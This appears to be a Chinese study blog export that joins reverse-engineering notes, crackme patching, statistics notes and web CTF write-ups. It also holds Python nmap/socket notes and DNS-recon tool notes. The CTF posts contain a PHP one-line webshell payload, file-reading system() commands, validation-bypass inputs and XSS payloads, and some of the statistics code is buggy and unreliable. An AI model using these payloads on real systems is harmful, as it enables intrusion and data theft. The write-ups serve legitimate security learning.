前提：删除基础重定位表对运行没什么影响\n从文件偏移270开始，到297\n打开010Editor直接删除，至此,.reloc被物理删除，之后开始修改相关PE头信息（就像改配置一样）\n修改IMAGE_FILE_HEADER-NUMBER of SECTIONS，5改成4\n之后修改IMAGE_OPTIONAL_HEADER-size of image\nVirualSize时E40，Section Alignment值为1000，故要减去1000\nupack压缩后的文件 把PE文件头变形，这部分有点不太明白，大概就是增大SizeOfOptionalHeader的值，在IMAGE_OPTIONAL_HEADER和IMAGE_SECTION_HEADER之间添加额外空间，添加解码代码，如下\n从170开始是IMAGE_SECTION_HEADER\n打开section选项，观察到第一个节区和第三个节区rawoffset起始偏移都是10，由此可知Upack会对PE文件头，第一个节区，第三个节区进行重叠\n进行调试，先要找出EP入口，EP的RVA为1018，ImageBase为0100000，故EP的VA值为01001018，xdbg已经打好断点了\n（忘记保存了）\nWindows消息钩取 HookMain.exe最先加载Keyhook.dll安装键盘钩子，使用SetWindowsHookEX()安装键盘钩子，OS强制键盘输入事件，调用KeyHook.dll注入到相应进程的内存，调用KeuboardProc()函数，在ProcessExplorer中检索Keyhook.dll发现如下\n1 2 3 4 5 6 7 8 9 10 11 HHOOK SetWindowsHookEx( ​ int idHook,//hook type ​ HOOKPROC lpfn,//hook procedure ​ HINSTANCE hMod,//hook procedure所属的DLL句柄 ​ DWORD dwThreadId,//想要钩载的线程 ) ","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E9%80%86%E5%90%91%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/","title":"逆向核心原理"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 # F系列【主要是调试状态的处理】 F2 添加/删除断点 F4 运行到光标所在位置 F5 反汇编 F7 单步步入 F8 单步跳过 F9 持续运行直到输入/断点/结束 shift系列【主要是调出对应的页面】 shift+F1 Local types shift+F2 execute scripts【常用】 shift+F3 Functions shift+F4 Names shift+F5 Signatures shift+F7 Segments shift+F8 Segments registers shift+F9 Structures shift+F10 Enumerations shift+F11 Type libraries shift+F12 Strings【常用】 Shift+E 导出数据【常用】 # 单字符系列【基本是数据处理转换相关】【这些都比较常用】 G 按地址查找 D 将字符串等元素转为数据 N 重命名（函数名、变量名等） Y 修改变量类型等（比如int改char等等） H decimal 数据的进制快速转换 A 将数据转变为字符串类型 C code（将数据转变为汇编代码，分为自动和强制执行） U undefined（将字符串转变为原始数据） X 交叉引用（反汇编页面） P 选中位置识别为函数 # Ctrl、Alt系列 Ctrl+F 搜索【常用】 Ctrl+X 交叉引用（汇编页面）【常用】 Alt+T 查找Text Ctrl+T 查找下一个text Alt+C Next Code Ctrl+D Next Data Ctrl+Z 撤销 Ctrl+Shift+Z 恢复 Alt+K 修改堆栈值 # else / 添加注释 or 右键选择edit comment【常用】 \\ hide cast，隐藏/显示一些变量类型注解 Ins 添加区块注释 通用寄存器 EAX：（针对操作数和结果数据的）累加器 EBX：（DS段的数据指针）基址寄存器 ECX：（字符串和循环操作的）计数器 EDX：（I/O指针）数据寄存器 ESI：（字符串操作源指针）源变址寄存器 EDI：（字符串操作目标指针）目的变址寄存器 EBP：（SS段中栈内数据指针）扩展基址指针寄存器[栈帧寄存器、栈底指针寄存器] ESP：（SS段中栈指针）栈指针寄存器[指向栈顶] 段寄存器 CS：代码段寄存器 SS：栈段寄存器 DS：数据段寄存器 FS：数据段寄存器 ES：附加数据寄存器 GS：数据段寄存器 程序状态与控制寄存器 EFLAGS：标志寄存器，32个位元的01控制 ZF(零标志器，运算结果为0时置1) CF(进位标志，运算结果向最高位以上进位时置1) OF(溢出标志) AF(辅助进位标志，运算结果在第3位的时候置1) SF(符号标志，有符号整型的符号位为1时置1) 指令指针寄存器 EIP / RIP：保存CPU要执行的指令地址 常用指令 操作码 目的操作数 源操作数\nPUSH/POP：压栈/出栈 PUSHA/POPA 、 PUSHAD/POPAD MOV/CALL/RET/LEA/INT/EMD：传送 / 调用 / 返回 / 加载 / 中断 / 结束 CMP/TEST：比较/测试（结果丢弃，只修改标志位寄存器） JMP系列跳转指令 ADD/SUB/SHL/SHR/ROL/ROR：加 / 减 / 逻辑左移 / 逻辑右移 / 循环左移 / 循环右移 INC/DEC ：加一 / 减一 MUL/IMUL：无符号乘法、整数乘法 DIV/IDIV：无符号除法、整数除法 AND/XOR/OR/NOT：与 / 异或 / 或 / 取反 栈帧 1 2 3 4 5 6 7 8 PUSH EBP ;函数开始 MOV EBP,ESP ;将栈顶地址存入EBP中 .... ;函数执行，期间EBP地址不变 MOV ESP,EBP ;基准点地址给到ESP POP EBP ;栈状态恢复，弹出EBP RETN ;函 IDA常用脚本 IDC\u0026amp;python，具体可以看IDA的官方书籍\nIDC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //获取寄存器的值 auto eax = GetRegValue(\u0026#34;EAX\u0026#34;); auto addr = 0x0; auto i = 0; for(i; i \u0026lt; 10; i = i+1) { //打印字节 Message(\u0026#34;%x\u0026#34;,Byte(addr+i)); //修改字节 PatchByte(addr+i,Byte()); } //dump数据 auto i,fp; fp = fopen(\u0026#34;D:\\\\dump2\u0026#34;,\u0026#34;wb\u0026#34;); for(i=0x10;i\u0026lt;0x12;i++) fputc(Byte(i),fp); print(\u0026#34;end\u0026#34;); python 1 2 3 4 5 6 7 8 # 导入头文件 from idaapi import * # 获取寄存器的值 espval = get_reg_val(\u0026#39;esp\u0026#39;) # 获取字节值ida_bytes.get_word() value = ida_bytes.get_word(address) # 获取16字节长度的数据 ida_bytes.get_bytes(address, 16) easy动态调试 思路：把不在主函数里面的函数运行下就行\nEIP修改为_ques函数的地址F9运行就行，拿到Flag\nez_xor 下面是XOR的encode函数\n一开始想了下a2是什么，发现就是传参\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char const *argv[]) { char flag1[] = \u0026#34;E`}J]OrQF[V8zV:hzpV}fVF[t\u0026#34;; char flag[] = \u0026#34;\u0026#34;; for (int i = 0; i \u0026lt; strlen(flag1); i++) { flag1[i] ^= 3 * 3; printf(\u0026#34;%s\\n\u0026#34;, flag1); } } 好无聊啊，想做PWN题了\nXOR 这道题主要是array要看懂\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;stdlib.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main(int argc, char const *argv[]) { int flag1[] = {0x3FE, 0x3EB, 0x3EB, 0x3FB, 0x3E4, 0x3F6, 0x3D3, 0x3D0, 0x388, 0x3CA, 0x3EF, 0x389, 0x3CB, 0x3EF, 0x3CB, 0x388, 0x3EF, 0x3D5, 0x3D9, 0x3CB, 0x3D1, 0x3CD}; char flag[] = {}; for (int i = 0; i \u0026lt; 21; i++) { ​ flag[i] = (flag1[i] - 900) ^ 0x34; ​ printf(\u0026#34;%c\u0026#34;, flag[i]); } return 0; } CrakeMEV3 意思是要读取一个同目录下名为CRACJME3.KEY的文件，试过如果文件名不叫这个，调试暂停\n看到写在CRACKME3.KEY的字符，步进查看函数\nabexcrakeme3 思路：要找一本abex.l2c文件，那就自己创建一个，下面还有两个比较跳转，直接爆破，把两个jne nop掉，秒了\ncosh1.exe 第一个爆破点：把jz换成jmp，强制跳转，不用看条件\n继续找，在函数头下断点，由于程序已经运行，直接按check for CD\n算法：就是在各种光驱里面循环查找，找有没CD_CHECK.DAT的文件\nAcid_burn 第一个serial incorrect jge改成jmp\n第二个serial jnz给nop掉\n秒了\n算法分析：看右上角寄存器，自己输入1234放在寄存器EDX中，EAX是一段字符串，猜测明文是\u0026quot;CW-4018-CRACKED\u0026quot;\n拖到IDA中分析，找CRACKED所在的函数，差不多就是下面一段\n1 2 3 4 5 6 7 8 9 void Decryption(char* mima) { char szBuff[260]; unsigned long data = (unsigned long)mima[0]; data *= 0X29; data *= 2; sprintf(szBuff, \u0026#34;CW-%d-CRACKED\u0026#34;, data); printf(\u0026#34;%s \\r\\n\u0026#34;, szBuff); } fakebase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 flag = \u0026#39;xxxxxxxxxxxxxxxxxxx\u0026#39; s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; tmp = \u0026#39;\u0026#39; for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) # 将每个字符转换为二进制字符串，并填充到 8 位 b1 = int(tmp,2) # 将拼接后的二进制字符串转换为十进制整数 s = \u0026#39;\u0026#39; while b1//31 != 0: s += s_box[b1%31]# 将余数映射到 s_box 中的字符，并拼接到 s 中 b1 = b1//31 print(s) \\# s = u#k4ggia61egegzjuqz12jhfspfkay 动态调试crackme 经分析，string1和string2的子串比对，进而输出判断结果，在判断结束的地方下断点，ExitProcess(0)\nXDBG调试\n要求Name输入crackme\n一步步直到出现This serial sucks，回过去看看和那个字段做了比较，要比较的字段就是正确的serial\n一般在stramp下断点\nQA:为什么在程序失败返回才能出现正确的序列号\n[SWPUCTF 2021 新生赛]fakebase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 flag = \u0026#39;xxxxxxxxxxxxxxxxxxx\u0026#39; s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; tmp = \u0026#39;\u0026#39; for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) b1 = int(tmp,2) s = \u0026#39;\u0026#39; while b1//31 != 0: s += s_box[b1%31] b1 = b1//31 print(s) \\# s = u#k4ggia61egegzjuqz12jhfspfkay 将flag中每个字符影射为字符集的code point, 转换为二进制, 再转换为十进制, 再转换为最低位在前的31进制,\n先把s逆回去\n1 2 3 4 5 6 7 8 9 import libnum s=\u0026#34;u#k4ggia61egegzjuqz12jhfspfkay\u0026#34;[::-1] s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; print(s) for i in range(5): key = i for j in range((len(s))): key = key *31 + s_box.index(s[j]) print(libnum.n2s(int(key))) 看着答案，想起大一高代学的辗转相除，就是欧几里得算法\n扩展欧几里得算法可用于RSA加密等领域。\n假如需要求 1997 和 615 两个正整数的最大公约数,用欧几里得算法，是这样进行的：\n1997 ÷ 615 = 3 (余 152)\n615 ÷ 152 = 4(余7)\n152 ÷ 7 = 21(余5)\n7 ÷ 5 = 1 (余2)\n5 ÷ 2 = 2 (余1)\n2 ÷ 1 = 2 (余0)\n至此，最大公约数为1\n以除数和余数反复做除法运算，当余数为 0 时，取当前算式除数为最大公约数，所以就得出了 1997 和 615 的最大公约数 1。\n证法一 a可以表示成a = kb + r（a，b，k，r皆为正整数，且r不为0）\n假设d是a,b的一个公约数，记作d|a,d|b，即a和b都可以被d整除。\n而r = a - kb，两边同时除以d，r/d=a/d-kb/d，由等式右边可知m=r/d为整数，因此d|r\n因此d也是b,a mod b的公约数。\n因(a,b)和(b,a mod b)的公约数相等，则其最大公约数也相等，得证。\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E9%80%86%E5%90%91%E5%B0%8F%E7%99%BD/","title":"逆向小白"},{"content":"总体：X\n个体：Xi\n样本：(X1，X2，\u0026hellip;\u0026hellip;.Xn)随机变量\n样本值：n个独立样本的一次实现(x1,x2,\u0026hellip;\u0026hellip;.xn)具体的数\n随机抽样：无放回：近似独立同分布，n/N\u0026lt;1,放回:独立分布\n$$ proof: $$ 分层抽样：不独立\n分群抽样\n非参数统计，非参数估计，核密度估计，非参数假设检验\n非参数统计方法无需假定总体分布，可以通过样本信息来推断总体，而参数统计则需要已知或假定总体分布。因此较参数统计（即一般意义下的数理统计），非参数统计适用面更广。但非参数统计推断的准确度较低。应注意的是非参数统计只是不依赖总体分布，但有些统计量的信息还是需要知道，并且研究的对象依旧是反映总体特征的统计量。\n描述样本的中心化趋势 均值，可能会带来失帧\n中位数，样本从小到大排序的次序统计量的中间值\n众数\n变量的度量 为什么计算样本方差分母是n-1?\n极差，总体/样本方差，标准差\n分位数 百分位数，计算i=n*(p/100) 若i为整数，q(p)=(x[i]+x[i+1])/2\n若i不为整数q(p)=x[i]+1\n四分位数 Box-Whisker图 箱线图是一种基于五个数字摘要显示数据集的标准化方式：最小值、最大值、样本中位数以及第一和第三个四分位数。\nMinimum (*Q*0 or 0th percentile): the lowest data point in the data set excluding any outliers **最小值（*Q*0 或第 0 个百分位数）：**数据集中不包括任何异常值的最低数据点 Maximum (*Q*4 or 100th percentile): the highest data point in the data set excluding any outliers **最大值（*Q*4 或第 100 个百分位数）：**数据集中不包括任何异常值的最高数据点 Median (*Q*2 or 50th percentile): the middle value in the data set **中位数（*Q*2 或第 50 个百分位数）：**数据集中的中间值 First quartile (*Q*1 or 25th percentile): also known as the lower quartile q**n(0.25), it is the median of the lower half of the dataset. 第一四分位数（*Q*1 或第 25 个百分位数）：也称为*下四分位数qn*（0.25），它是数据集下半部分的中位数。 Third quartile (*Q*3 or 75th percentile): also known as the upper quartile q**n(0.75), it is the median of the upper half of the dataset.[7] 第三个四分位数（*Q*3 或第 75 个百分位数）：也称为*上四分位数qn*（0.75），它是数据集上半部分的中位数。[7] 数据分析推断前期：可视化！\n样本方差 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def calculate_mean(numbers): s=sum(numbers) N=len(numbers) #calculate the mean mean = s/N return mean def find_diff(numbers): #find the mean mean=calculate_mean(numbers) diff=[] for i in numbers: diff.append(num-mean) return diff def calculate_variance(numbers): diff = find_diff(numbers) squ=[] for i in diff: squ.append(i**2) variance=sum(squ)/N-1 return variance 样本矩 ak\nbk\n样本偏度\n样本蜂度\n有无中心对称，左偏or右偏分布？看尾巴在哪一侧\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def calculate_ak(numbers,k): N=len(numbers) ak=[] for i in numbers: ak.append(i**k) return ak def calculate_bk(numbers,k): N=len(numbers) bk=[] find_diff=0 mean=calculate_mean(numbers) for i in numbers: find_diff+=((i-mean)**k) return find_diff/N def yangben_piandu(numbers): return calculate_bk(numbers,3)/(calculate_bk(numbers,2)**1.5) def yangben_fengdu(numbers): return (calculate_bk(numbers,4)/(calculate_bk(numbers,2)**2)) -3 次序统计量 1 2 3 4 5 6 7 def order_statistics(numbers): if k\u0026lt;1 or k\u0026gt;len(numbers): return ValueError(\u0026#34;\u0026#34;) else: sorted_numbers=sorted(numbers) return sorted_numbers 设总体X~U(0,1),则第k个次序统计量的密度函数\n样本p分位数 1 2 3 4 5 6 7 8 9 10 def is_integer(n,p)： return isinstance(n*p,int) def calculate_p(numbers,n,p): N=len(numbers) numbers.sort() if is_integer: return numbers[n*p+1] else: return (numbers[n*p]+numbers[n*p+1])/2 三大抽样分布 统计量的构造 1 2 3 4 5 6 7 8 9 10 11 12 13 def fenbu1(numbers): k2=0 for i in len(numbers): k2 += numbers[i]**2 return k2 def fenbu2(numbers1,numbers2): F=0 N1=len(numbers1) N2=len(numbers2) a=fenbu1(numbers1)/N1 b=fenbu2(numbers2)/N2 F=a/b return F ","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/","title":"数理统计"},{"content":"web2：view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的\u0026quot;查看源代码\u0026quot;命令.以前的使用方法：在浏览器地址栏中输入 view-source: URL\nweb3:打开burp suite然后在仪表盘选择新扫描输入url（网址）后点击确定，然后点击目标，选择相应\u0026ndash;raw就可以看见flag了or F12 \u0026mdash;\u0026gt;选择网络\u0026mdash;\u0026gt;F5刷新页面，查看响应头。\nweb4：robots.txt（爬虫协议）\nweb5：目录扫描：index.phps(php文件)\nphps文件泄露，phps存放着php源码,可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取.\nweb6：url/www.zip网站备份压缩文件 漏洞成因\n在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。\n当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。\n该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。\n该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。\n被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。\n.rar .zip .7z .tar.gz .bak .swp .txt\n源码泄露 url/www.zip 得知隐藏目录/fl000g.txt\nweb7: dirsearch -u url 发现目录 /.git\nweb8 /.svn 代码版本管理工具\nweb9: 本题目的是让答题者了解到vim编辑器使用时会有一个缓存文件，这个缓存文件在保存时进行删除，但是在vim意外退出时这个缓存文件，会以源文件加一个.swp后缀进行保存，我们可以尝试访问这些文件来尝试获取一些文件。\n/index.php.swp\nweb10:network cookie\n本题目是让答题者了解到cookie，cookie一般用于在身份认证的过程中保存一些信息，用于服务器来验证身份,在测试中可以尝试注入等方式。可以使用burp/F12中的网络来查看\nweb11:dns查找域名\nweb12:查看robots.txt文件，用户名admin。密码：在页面的最下方 管理员界面：/admin\nweb13:/document.pdf，底部信息\n本题目的是答题者了解到很多的文章有许多的文档，可以在这些文档中发现很多信息，例如文件中有许多的信息泄露的地方，本题在底部的document这个这个文本中记录到有地址和密码。\nweb14:根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问\nweb15:/admin 忘记密码，密保问题。首先，在网页最下方发现一个邮箱，于是就去QQ上搜索了一下QQ号，只是发现了一个账号，地点是陕西西安，社工搜索，telegram暗精灵\nweb16:考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag\nweb17:/backup.sql 备份的sql文件\nweb18:这是一个javascript 的游戏，游戏的目的就是让要赢，从js代码中可知，当score\u0026gt;120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score=130 game_over=false 然后，执行游戏 的run() 即可得到 \u0026ldquo;你赢了，去幺幺零点皮爱吃皮看看\u0026rdquo;， 即，110.php 打开它，即得flag\nweb19:js查看源码，得知post提交账户密码，用hackbar\nweb20：mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}\nweb89\nisset() 用于检查 $_GET['num'] 是否存在。如果变量存在且值不为 NULL，则返回 true，否则返回 false。 preg_match() 用于检查 $_GET['num'] 是否包含数字字符。如果模式匹配到，则返回 1，否则返回 0。 intval() 用于将 $_GET['num'] 转换为整数并检查其是否为非零值。返回变量的整数值 利用数组绕过正则表达式，?num[]=1\nweb90\n绕过十进制，我采用转换成16进制方法，?num=0x117c\nweb91\n正则表达式修饰符\n1 /^php$/im /^php$/：匹配字符串 \u0026ldquo;php\u0026rdquo;。 i：忽略大小写。 m：多行匹配，若存在换行\\n且有开始^或结束$，以换行为分隔符，逐行匹配 1 %0A` 表示换行符（`\\n payload：?cmd=%0aphp\nweb92\n方法一:intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以\n方法二:同web90\nweb93\n既然不能有字母，传换成八进制，?num=010574\nweb94\n在93的基础上过滤了开头为0的数字 这样的话就不能使用进制转换来进行操作 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0\n1 if(!strpos($num, \u0026#34;0\u0026#34;))//0不能放在第一位 web95\n1 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num))//点匹配没了 可以通过8进制绕过但是前面必须多加一个字节 ?num=+010574或者?num=%2b010574\nweb96\n在linux下面表示当前目录是 ./ 所以我们的payload： u=./flag.php\n不能直接?u=flag.php会被过滤\nweb97（这题不太懂其实）\nmd5绕过原理：md5对数组是不予加密的，但是这个函数是返回值类型的，没有返回对象，便是返回null（null是无对象的意思，可以理解为没有目标）,所以两个都是null，可以绕过里面的比较，但是外面还有一个a!=b,绕过姿势为：?a[]=1\u0026amp;b[]=2\nweb98\n三元运算符，if使用\n(expr1)?(expr2)：(expr3)\n如果expr1成立，则执行expr2，否则执行expr3\n1 $_GET=\u0026amp;$_POST;//只要有输入的get参数就将get方法改变为post方法 我们只需要 GET一个?HTTP_FLAG=flag 加 POST一个HTTP_FLAG=flag,get直接url？，post用hackbar\nweb99\nfile_put_contents()写入文件\n1 弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的,满足条件，同时进入下一步后，我们就可将一句话木马写入了5.php中 get:?n=5.php post:content=\u003c?php @eval=$_POST=['hack'];?\u003e\n查看post:content=\u003c?php system('ls');?\u003e ,查看flag：content=\u003c?php system('tac flag36d.php');?\u003e\nweb100\n三个参数 v1 ，v2 ，v3，其中v0 实际上只会去判断v1是否为数字 ，因此v1 = 1234 数字即可\n1 2 3 4 5 6 7 8 9 if($v0){ if(!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)){ # 表示v2中不能有符号 ； if(preg_match(\u0026#34;/\\;/\u0026#34;, $v3)){ #表示v3 中必须要有 ; eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); # 这里是eval中 拼接v2 v3 } } } v2=var_dump($ctfshow)/* v3=*/; 拼接起来就是var_dump($ctfshow)/ (\u0026lsquo;ctfshow\u0026rsquo;) / ; 可以执行\nv2 也可以用其他显示输出的函数\n1 v2=print_r($ctfshow)/*\u0026amp;v3=*/; 注意拼接之后要把v3注释掉，flag要把02xd换成-\n","date":"2025-02-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/","title":"ctfshow通关"},{"content":"HTTP请求：抓包，把GET换成CTFHUB\n302跳转：网页临时移动到新的位置，而浏览器的缓存没有更新，flag在index.php下而跳转到index.html打开burp suite抓包，发送请求\ncookie:验证身份 抓包repeater模块改成admin=1发送请求\n基础认证：burpsuite字典爆破，加密\nsql注入：结合burpsuite（前端没有回显），hackbar\nXSS攻击 找一个xss网站，我找的是xssaq.com\n反射型XSS 恶意JavaScript脚本属于用户发送给网站请求中的一部分，随后网站又将这部分返回给用户，恶意脚本在页面中被执行。一般发生在前后端一体的应用中，服务端逻辑会改变最终的网页代码。\n攻击步骤\n1.攻击者构造出特殊的 URL，其中包含恶意代码。 2.用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。 3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n由于HTML文档具有扁平的、串行的结构，混合了控制语句、格式和实际内容，因此在结果页面中包含任何未经验证的用户提供的数据而没有进行正确的HTML编码，可能导致标记注入。一个经典的潜在攻击向量例子是站点搜索引擎：如果用户搜索一个字符串，搜索字符串通常会在结果页面上逐字显示，以表明搜索内容。如果该响应没有正确转义或拒绝HTML控制字符，就会导致跨站脚本漏洞。\n反射型攻击通常通过电子邮件或一个中立的网站传递。诱饵是一个看似无害的URL，指向一个可信赖的网站，但包含XSS攻击向量。如果该可信赖的网站对该向量存在漏洞，点击链接可能会导致受害者的浏览器执行注入的脚本。\n这里用最经典的paylaod来进行判断是否存在xss\n1 \u0026#34;\u0026#34;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026#34;//这是语句是让浏览器弹框 题目中第二个输入框模拟受害者访问，这里的payload需要从xss平台中复制\n在XSS网站上\n存储型XSS 黑客将恶意 JavaScript 脚本长期保存在服务端数据库中，用户一旦访问相关页面数据，恶意脚本就会被执行。常见于搜索、微博、社区贴吧评论等。 存储型 XSS 的攻击步骤：\n1.攻击者将恶意代码提交到目标网站的数据库中。 2.用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。 3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。\n和上面的是一样的，存储型就是把恶意代码存储进了数据库，每次查库就会触发恶意代码。\nDOM型XSS攻击 DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。\n在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等\nDOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。\n在使用 .innerHTML、.outerHTML、document.write() 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等 DOM型XSS的攻击步骤\n攻击者构造出特殊的 URL，其中包含恶意代码。 用户打开带有恶意代码的 URL。 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。 恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。 简单来说就是在前端页面上寻找注入点\n通过构造html语法的闭合，将脚本输入进去，同前面一样\nDOM跳转 审查源代码\n注意！当你将类似于 \u0026lsquo;\u0026lsquo;\u0026rsquo;location.href = \u0026ldquo;javascript:alert(\u0026lsquo;xss\u0026rsquo;)\u0026rdquo;\u0026rsquo;\u0026rsquo;\u0026rsquo; 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。\n直接在网页url后面跟上代码测试反弹\n1 \u0026#39;\u0026#39;\u0026#39;javascript:alert(1)\u0026#39;\u0026#39;\u0026#39; 跟前面老步骤\n文件上传 文件上传漏洞服务端代码未对客户端上传的文件进行严格的验证，导致漏洞。非法用户可以利用上传的恶意文件控制整个网站，这个恶意文件被称为 WebShell ，也可以称为一种网页后门。 1.1常见的WebShell有哪些？\n拥有较完整功能的webshell，我们一般称为大马。 功能简易的webshell称为小马。 除此之外还存在一句话木马、菜刀马、脱库马等等的名词，是对于webShell功能或者特性的简称。 1.2 一句话木马演示\n","date":"2025-02-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfhub-web/","title":"ctfhub-web"},{"content":"UDP TCP 客户端 服务器\nsocket实例化 socket(family,type,[protocal])协议族（默认AF_INET),,SOCK_STREAM(TCP)/SOCK_DGRAM(UDP)\ns=socket.socket()\n初始化TCP:s=socket.socket()\n初始化UDP:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\nsocket常用函数 服务器 s.bind((\u0026lsquo;127.0.0.1\u0026rsquo;,2345))绑定IP和端口\ns.listen(5)最大监听5个端口\nconn,address=s.accept()套字对象，客户端地址（本机）\n客户端 s.connect((\u0026ldquo;127.0.0.1\u0026rdquo;,2345))\n通用 send()\nsendall()区别在于可以完整发送TCP数据\ns.snedall(bytes(\u0026ldquo;Hello\u0026rdquo;,encoding=\u0026ldquo;utf-8\u0026rdquo;))\nrecv(bufsize)最多可以接受的数量\nsendto(string[,flag],address)使用UDP时发送数据\nrecovfrom(data,address) UDP专用，接受数据\nclose()关闭socket\nnmap实例化 nm = nmap.PortScannerAsycn()\n常见函数 scan(self,hosts=\u0026ldquo;127.0.0.1\u0026rdquo;,ports=None,arguments=\u0026quot;-sV\u0026quot;,sudo=False)\nnm.scan(\u0026ldquo;127.0.0.1\u0026rdquo;,\u0026ldquo;1-500\u0026rdquo;,\u0026quot;-sS\u0026quot;)1-500端口\nnm.all_hosts()返回被扫描的所有主机列表\nnm.command_line()返回再当前扫描中使用的命令行\nnm.csv()返回被扫描主机的csv格式的文件\nprint（nm.csv())希望看得更清楚\nnm.has_hsot检查是否有host扫描结果，返回值为false/true\nnm.scaninfo()列出扫描信息的结构\nnmp[\u0026ldquo;192.168.1.101\u0026rdquo;].hostname()获取192.168.1.1.1的主机名\nstill_scanning()是否正在扫描\nwait（2）等待时间\nstop（）停止当前扫描\n","date":"2025-02-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/python%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","title":"Python渗透测试"},{"content":"DNS侦察 DNSMAP DNS枚举并保存为txt DNSRecon A:IP MX:邮箱 NS:名称服务器 TXT:文本 ​ IP地址反向查询\nfierce 目标子域名和IP 主机枚举 ATK6 枚举主机，发现新设备，发起拒绝服务攻击，利用已知漏洞；检测内网中存活的IPv6主机\nhping3 发送ICMP请求，DDoS攻击，扫描主机端口，Fin扫描\nnmap 6种端口状态，\u0026ndash;spoof-mac -伪造nmap所在主机地址，-f分段处理加大目标主机上防火墙的拦截难度，-D 